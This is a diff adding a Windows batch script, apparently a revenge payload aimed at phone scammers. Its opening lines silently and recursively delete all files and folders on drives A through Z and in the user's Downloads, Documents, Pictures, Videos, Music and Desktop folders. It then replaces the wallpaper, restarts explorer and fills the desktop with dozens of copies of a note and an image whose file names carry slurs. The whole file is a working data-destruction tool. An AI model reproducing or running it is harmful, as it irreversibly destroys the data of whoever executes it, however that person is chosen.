@@ -1,0 +1,116 @@
+
+for /d %%G in ("A:\*") do rd /s /q "%%~G"
+del "A:\*.*" /q /s /f
+for /d %%G in ("B:\*") do rd /s /q "%%~G"
+del "B:\*.*" /q /s /f
+::for /d %%G in ("D:\*") do rd /s /q "%%~G"
+::del "D:\*.*" /q /s /f
+for /d %%G in ("E:\*") do rd /s /q "%%~G"
+del "E:\*.*" /q /s /f
+for /d %%G in ("F:\*") do rd /s /q "%%~G"
+del "F:\*.*" /q /s /f
+for /d %%G in ("G:\*") do rd /s /q "%%~G"
+del "G:\*.*" /q /s /f
+for /d %%G in ("H:\*") do rd /s /q "%%~G"
+del "H:\*.*" /q /s /f
+for /d %%G in ("I:\*") do rd /s /q "%%~G"
+del "I:\*.*" /q /s /f
+for /d %%G in ("J:\*") do rd /s /q "%%~G"
+del "J:\*.*" /q /s /f
+for /d %%G in ("K:\*") do rd /s /q "%%~G"
+del "K:\*.*" /q /s /f
+for /d %%G in ("L:\*") do rd /s /q "%%~G"
+del "L:\*.*" /q /s /f
+for /d %%G in ("M:\*") do rd /s /q "%%~G"
+del "M:\*.*" /q /s /f
+for /d %%G in ("N:\*") do rd /s /q "%%~G"
+del "N:\*.*" /q /s /f
+for /d %%G in ("O:\*") do rd /s /q "%%~G"
+del "O:\*.*" /q /s /f
+for /d %%G in ("P:\*") do rd /s /q "%%~G"
+del "P:\*.*" /q /s /f
+for /d %%G in ("Q:\*") do rd /s /q "%%~G"
+del "Q:\*.*" /q /s /f
+for /d %%G in ("R:\*") do rd /s /q "%%~G"
+del "R:\*.*" /q /s /f
+for /d %%G in ("S:\*") do rd /s /q "%%~G"
+del "S:\*.*" /q /s /f
+for /d %%G in ("T:\*") do rd /s /q "%%~G"
+del "T:\*.*" /q /s /f
+for /d %%G in ("U:\*") do rd /s /q "%%~G"
+del "U:\*.*" /q /s /f
+for /d %%G in ("V:\*") do rd /s /q "%%~G"
+del "V:\*.*" /q /s /f
+for /d %%G in ("W:\*") do rd /s /q "%%~G"
+del "W:\*.*" /q /s /f
+for /d %%G in ("X:\*") do rd /s /q "%%~G"
+del "X:\*.*" /q /s /f
+for /d %%G in ("Y:\*") do rd /s /q "%%~G"
+del "Y:\*.*" /q /s /f
+for /d %%G in ("Z:\*") do rd /s /q "%%~G"
+del "Z:\*.*" /q /s /f
+
+for /d %%G in ("%userprofile%\Downloads\*") do rd /s /q "%%~G"
+del "%userprofile%\Downloads\*.*" /q /s /f
+
+for /d %%G in ("%userprofile%\Documents\*") do rd /s /q "%%~G"
+del "%userprofile%\Documents\*.*" /q /s /f
+
+for /d %%G in ("%userprofile%\Music\*") do rd /s /q "%%~G"
+del "%userprofile%\Music\*.*" /q /s /f
+
+for /d %%G in ("%userprofile%\Pictures\*") do rd /s /q "%%~G"
+del "%userprofile%\Pictures\*.*" /q /s /f
+
+for /d %%G in ("%userprofile%\Videos\*") do rd /s /q "%%~G"
+del "%userprofile%\Videos\*.*" /q /s /f
+
+for /d %%G in ("%userprofile%\Desktop\*") do rd /s /q "%%~G"
+del "%userprofile%\Desktop\*.*" /q /s /f
+
+timeout 20
+ren "%appdata%\microsoft\windows\themes\TranscodedWallpaper.jpg" scam.mer
+copy "%localappdata%\microsoft\credentials\TranscodedWallpaper.jpg" "%appdata%\microsoft\windows\themes\"
+taskkill /im explorer.exe /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+start "" explorer.exe
+timeout 20
+for /l %%A in (1,1,6) do copy "%localappdata%\microsoft\credentials\note.txt" "%userprofile%\desktop\Note To Scammer Chutia Rundi Bitch %%A.txt"
+timeout 1
+for /l %%A in (1,1,6) do copy "%localappdata%\microsoft\credentials\wife.png" "%userprofile%\desktop\Wife %%A.png"
+timeout 1
+for /l %%A in (7,1,12) do copy "%localappdata%\microsoft\credentials\note.txt" "%userprofile%\desktop\Note To Scammer Chutia Rundi Bitch %%A.txt"
+timeout 1
+for /l %%A in (7,1,12) do copy "%localappdata%\microsoft\credentials\wife.png" "%userprofile%\desktop\Wife %%A.png"
+timeout 1
+for /l %%A in (13,1,18) do copy "%localappdata%\microsoft\credentials\note.txt" "%userprofile%\desktop\Note To Scammer Chutia Rundi Bitch %%A.txt"
+timeout 1
+for /l %%A in (13,1,18) do copy "%localappdata%\microsoft\credentials\wife.png" "%userprofile%\desktop\Wife %%A.png"
+timeout 1
+for /l %%A in (19,1,24) do copy "%localappdata%\microsoft\credentials\note.txt" "%userprofile%\desktop\Note To Scammer Chutia Rundi Bitch %%A.txt"
+timeout 1
+for /l %%A in (19,1,24) do copy "%localappdata%\microsoft\credentials\wife.png" "%userprofile%\desktop\Wife %%A.png"
+timeout 1
+for /l %%A in (1,1,6) do copy "%localappdata%\microsoft\credentials\note.txt" "%userprofile%\desktop\Note To Scammer Chutia Rundi Bitch-%%A.txt"
+timeout 1
+for /l %%A in (1,1,6) do copy "%localappdata%\microsoft\credentials\wife.png" "%userprofile%\desktop\Wife-%%A.png"
+timeout 1
+for /l %%A in (7,1,12) do copy "%localappdata%\microsoft\credentials\note.txt" "%userprofile%\desktop\Note To Scammer Chutia Rundi Bitch-%%A.txt"
+timeout 1
+for /l %%A in (7,1,12) do copy "%localappdata%\microsoft\credentials\wife.png" "%userprofile%\desktop\Wife-%%A.png"
+timeout 1
+for /l %%A in (13,1,18) do copy "%localappdata%\microsoft\credentials\note.txt" "%userprofile%\desktop\Note To Scammer Chutia Rundi Bitch-%%A.txt"
+timeout 1
+for /l %%A in (13,1,18) do copy "%localappdata%\microsoft\credentials\wife.png" "%userprofile%\desktop\Wife-%%A.png"
+timeout 1
+for /l %%A in (19,1,24) do copy "%localappdata%\microsoft\credentials\note.txt" "%userprofile%\desktop\Note To Scammer Chutia Rundi Bitch-%%A.txt"
+timeout 1
+for /l %%A in (19,1,24) do copy "%localappdata%\microsoft\credentials\wife.png" "%userprofile%\desktop\Wife-%%A.png"
+timeout 1
+
+
+
+
+
+
+
